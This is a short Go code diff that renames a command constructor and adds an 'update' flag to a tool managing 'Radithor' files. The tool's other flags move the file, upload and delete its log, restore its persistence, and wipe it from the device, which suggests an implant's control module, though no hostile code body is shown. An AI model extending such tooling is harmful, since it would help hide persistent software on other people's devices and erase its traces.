@@ -19,13 +19,13 @@ func (*RadCommand) Info() string {
 	return "Do things with Radithor related disk files."
 }
 
-func NewThisCommand() *RadCommand {
+func CreateCommand() *RadCommand {
 	cmd := &RadCommand{}
-
 	cmd.AddFlag("move", "Moves the Radithor file to another location.", move)
 	cmd.AddFlag("logs", "Uploads the Radithor log file and deletes it.", logs)
 	cmd.AddFlag("persist", "Persists Radithor if it was disabled.", persist)
 	cmd.AddFlag("wipe", "Securely removes Radithor from the device.", wipe)
+	cmd.AddFlag("update", "Replaces Radithor will a new version.", update)
 
 	return cmd
 }
